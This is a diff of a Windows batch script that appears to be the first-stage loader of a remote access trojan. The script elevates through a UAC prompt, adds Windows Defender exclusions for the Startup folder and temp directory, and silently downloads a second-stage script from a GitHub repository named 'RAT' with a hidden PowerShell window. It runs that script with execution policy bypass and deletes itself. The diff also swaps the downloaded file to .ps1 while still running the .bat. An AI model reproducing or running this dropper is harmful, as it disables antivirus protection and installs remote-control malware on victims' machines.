@@ -10,7 +10,7 @@ if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 ) else (
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
 if '%errorlevel%' NEQ '0' (
-    echo Request admin priv
+    @rem echo Request admin priv
     goto UACPrompt
 ) else ( goto gotAdmin )
 
@@ -27,7 +27,7 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
-powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
+powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.ps1 -o secondary.ps1
 timeout 5
 powershell -windowstyle hidden -ep bypass ./secondary.bat
 del Starter.bat
